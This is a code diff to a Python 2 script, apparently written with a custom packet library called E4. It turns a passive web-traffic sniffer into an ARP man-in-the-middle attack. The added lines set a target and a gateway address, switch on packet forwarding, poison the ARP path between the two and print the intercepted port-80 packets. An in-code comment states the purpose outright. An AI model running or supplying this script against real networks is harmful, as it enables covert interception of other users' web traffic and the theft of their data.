@@ -1,22 +1,35 @@
 #!/usr/bin/python
 
-import E4, E4Web, sys
+import E4, E4Web, E4Arp, sys
 
+# ARP MITM attack and sniff Web traffic.
+
+e4Arp = E4Arp.Arp()
 e4Sniffer = E4.AsyncSniffer()
 e4PacketLog = E4.PacketLog()
-e4Web = E4Web.Web()
+
+target = E4.NetworkObject()
+target.setIP('<address>')
+
+gateway = E4.NetworkObject()
+gateway.setIP('<address>')
+
+e4Arp.forward(True)
+e4Arp.MITM(target, gateway)
 
 e4Sniffer.sniff(packetLog=e4PacketLog, filter='port 80')
 
-while True:
-    if e4PacketLog.waitForPackets(timeout=60) == None:
-        print 'Timeout Reached.'
-        sys.exit()
+try:
+    while True:
+        e4PacketLog.waitForPackets()
 
-    for p in e4PacketLog.takeAll():
-        print 'Source: %s:%d (%s)' % (p.source().ip, p.source().port, p.source().mac)
-        print 'Destination: %s:%d (%s)' % (p.destination().ip, p.destination().port, p.destination().mac)
-        print 'Response: %s' % e4Web.grabResponse(p, textResponse=True)
-        headers = e4Web.headers(p)
-        print 'Host Header: %s' % e4Web.grabHeader(headers, 'Host', 'None.')
-        print '...'
+        for packet in e4PacketLog.takeAll():
+            print packet.sp().summary()
+
+except KeyboardInterrupt:
+    e4Arp.forward(False)
+    sys.exit()
+
+except:
+    e4Arp.forward(False)
+    sys.exit()
